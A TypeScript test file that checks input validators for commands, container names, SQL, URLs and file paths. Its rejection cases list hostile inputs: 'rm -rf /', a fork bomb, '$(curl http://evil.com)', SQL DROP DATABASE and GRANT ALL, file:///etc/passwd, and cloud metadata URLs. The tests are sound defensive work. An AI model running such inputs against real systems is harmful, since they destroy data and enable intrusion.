import test from "node:test";
import assert from "node:assert/strict";
import {
  validateCommand,
  validateContainerName,
  validateDbEngine,
  validateSearchQuery,
  validateSqlQuery,
  validateUrl,
  validateFilePath,
} from "../tools/inputValidation";

// Command validation
test("validateCommand: accepts normal commands", () => {
  assert.equal(validateCommand("ls -la").valid, true);
  assert.equal(validateCommand("npm run build").valid, true);
  assert.equal(validateCommand("git status && git diff").valid, true);
  assert.equal(validateCommand("cat foo.txt | grep bar").valid, true);
});

test("validateCommand: rejects empty command", () => {
  assert.equal(validateCommand("").valid, false);
  assert.equal(validateCommand("  ").valid, false);
});

test("validateCommand: rejects destructive patterns", () => {
  assert.equal(validateCommand("; rm -rf /").valid, false);
  assert.equal(validateCommand("echo hi; dd if=/dev/zero").valid, false);
  assert.equal(validateCommand("$(curl http://evil.com)").valid, false);
  assert.equal(validateCommand(":(){:|:&};:").valid, false);
});

test("validateCommand: rejects overly long commands", () => {
  const long = "a".repeat(10_001);
  assert.equal(validateCommand(long).valid, false);
});

test("validateCommand: allows rm on specific paths", () => {
  assert.equal(validateCommand("rm -rf ./dist").valid, true);
  assert.equal(validateCommand("rm temp.txt").valid, true);
});

// Container name validation
test("validateContainerName: accepts valid names", () => {
  assert.equal(validateContainerName("my-container").valid, true);
  assert.equal(validateContainerName("app_v2.1:latest").valid, true);
  assert.equal(validateContainerName("abc123").valid, true);
});

test("validateContainerName: rejects empty", () => {
  assert.equal(validateContainerName("").valid, false);
});

test("validateContainerName: rejects invalid chars", () => {
  assert.equal(validateContainerName("my container").valid, false);
  assert.equal(validateContainerName("../../etc").valid, false);
  assert.equal(validateContainerName("$(evil)").valid, false);
});

// DB engine validation
test("validateDbEngine: accepts supported engines", () => {
  assert.equal(validateDbEngine("postgres").valid, true);
  assert.equal(validateDbEngine("PostgreSQL").valid, true);
  assert.equal(validateDbEngine("mysql").valid, true);
  assert.equal(validateDbEngine("sqlite").valid, true);
});

test("validateDbEngine: rejects unsupported", () => {
  assert.equal(validateDbEngine("oracle").valid, false);
  assert.equal(validateDbEngine("mongodb").valid, false);
  assert.equal(validateDbEngine("").valid, false);
});

// SQL query validation
test("validateSqlQuery: accepts normal queries", () => {
  assert.equal(validateSqlQuery("SELECT * FROM users").valid, true);
  assert.equal(validateSqlQuery("INSERT INTO logs (msg) VALUES ('test')").valid, true);
  assert.equal(validateSqlQuery("UPDATE settings SET value = 'new' WHERE key = 'theme'").valid, true);
  assert.equal(validateSqlQuery("DELETE FROM temp WHERE created_at < '2024-01-01'").valid, true);
});

test("validateSqlQuery: rejects empty", () => {
  assert.equal(validateSqlQuery("").valid, false);
});

test("validateSqlQuery: rejects dangerous patterns", () => {
  assert.equal(validateSqlQuery("; DROP DATABASE production").valid, false);
  assert.equal(validateSqlQuery("; TRUNCATE TABLE users").valid, false);
  assert.equal(validateSqlQuery("GRANT ALL ON *.* TO 'root'").valid, false);
  assert.equal(validateSqlQuery("ALTER SYSTEM SET max_connections = 1").valid, false);
});

test("validateSqlQuery: rejects overly long queries", () => {
  const long = "SELECT " + "a, ".repeat(25_000);
  assert.equal(validateSqlQuery(long).valid, false);
});

// URL validation
test("validateUrl: accepts valid HTTP URLs", () => {
  assert.equal(validateUrl("http://localhost:3000/api").valid, true);
  assert.equal(validateUrl("https://api.example.com/v2").valid, true);
  assert.equal(validateUrl("http://192.168.1.1:8080/health").valid, true);
});

test("validateUrl: rejects empty", () => {
  assert.equal(validateUrl("").valid, false);
});

test("validateUrl: rejects non-http protocols", () => {
  assert.equal(validateUrl("ftp://files.example.com").valid, false);
  assert.equal(validateUrl("file:///etc/passwd").valid, false);
  assert.equal(validateUrl("javascript:alert(1)").valid, false);
});

test("validateUrl: rejects cloud metadata endpoints", () => {
  assert.equal(validateUrl("http://169.254.169.254/latest/meta-data/").valid, false);
  assert.equal(validateUrl("http://metadata.google.internal/").valid, false);
});

test("validateUrl: rejects invalid format", () => {
  assert.equal(validateUrl("not a url").valid, false);
});

test("validateSearchQuery: accepts normal queries", () => {
  assert.equal(validateSearchQuery("typescript handbook").valid, true);
});

test("validateSearchQuery: rejects empty and oversize", () => {
  assert.equal(validateSearchQuery("").valid, false);
  assert.equal(validateSearchQuery("a".repeat(401)).valid, false);
});

// File path validation
test("validateFilePath: accepts normal paths", () => {
  assert.equal(validateFilePath("src/main.ts").valid, true);
  assert.equal(validateFilePath("/absolute/path.txt").valid, true);
  assert.equal(validateFilePath("../relative.js").valid, true);
});

test("validateFilePath: rejects empty", () => {
  assert.equal(validateFilePath("").valid, false);
});

test("validateFilePath: rejects null bytes", () => {
  assert.equal(validateFilePath("file\0.txt").valid, false);
});
